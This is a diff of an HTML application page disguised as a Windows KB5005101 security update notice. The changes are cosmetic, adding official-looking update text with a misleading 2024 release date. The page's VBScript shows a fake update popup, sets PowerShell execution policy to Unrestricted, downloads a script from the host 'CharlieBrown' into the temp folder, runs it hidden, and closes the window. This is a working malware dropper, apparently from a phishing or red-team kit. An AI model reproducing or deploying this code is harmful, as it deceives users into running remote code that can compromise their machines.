@@ -1,5 +1,5 @@
 <html>
-<title>KB5005101 21H1 Security Update</title>
+<title>KB5005101 21H1 - Security Update</title>
 <script>
    path = document.URL
    document.write(
@@ -8,12 +8,32 @@
 </script>
 
 <body>
-<img src="C:\Windows\Web\Wallpaper\Windows\img0.jpg" alt="KB5005101 21H1" width="1395" height="660">
+<img src="C:\Windows\Web\Wallpaper\Windows\img0.jpg" alt="KB5005101 21H1" width="1395" height="440"><br /><br />
+<center><strong>Windows servicing stack update - 19041.1161, 19042.1161 and 19043.1161</strong></center><br />
+
+<textarea rows="7" cols="138" name="Update info" id="Update info">
+Release Date: 02/01/2024
+Version: OS Builds 19041.1161, 19042.1161 and 19043.1161
+
+This update makes quality improvements to the servicing stack, which is the component that installs Windows updates.
+Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can
+receive and install Microsoft updates. IMPORTANT This release includes the Flash Removal Package. Taking this update
+will remove Adobe Flash from the machine. For more information, see the Update on Adobe Flash Player End of Support.
+
+Devices with Windows installations created from custom offline media or custom ISO image might have Microsoft Edge
+Legacy removed by this update, but not automatically replaced by the new Microsoft Edge. This issue is only encountered
+when custom offline media or ISO images are created by slipstreaming this update into the image without having first
+installed the standalone servicing stack update (SSU) released March 29, 2023 or later.
+
+Note Devices that connect directly to Windows Update to receive updates are not affected. This includes devices
+using Windows Update for Business. Any device connecting to Windows Update should always receive the latest versions.
+of the SSU and latest cumulative update (LCU) without any extra steps.
+</textarea>
 </body>
 
 <SCRIPT LANGUAGE="VBScript">
    visible = false
-   CreateObject("wscript.shell").popup "Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161" & vbcrlf & "This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.", 3, "KB5005101 21H1 Security Update", 1
+   CreateObject("wscript.shell").popup "Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161" & vbcrlf & "This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.", 4, "KB5005101 21H1 - Security Update", 1
    CreateObject("WScript.Shell").run "cmd /R echo Y|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && powershell cd $Env:TMP;iwr -uri 'http://CharlieBrown/Update-KB5005101.ps1' -outfile 'Update-KB5005101.ps1';powershell -W 1 -file 'Update-KB5005101.ps1'", visible
    window.close()
 </SCRIPT>
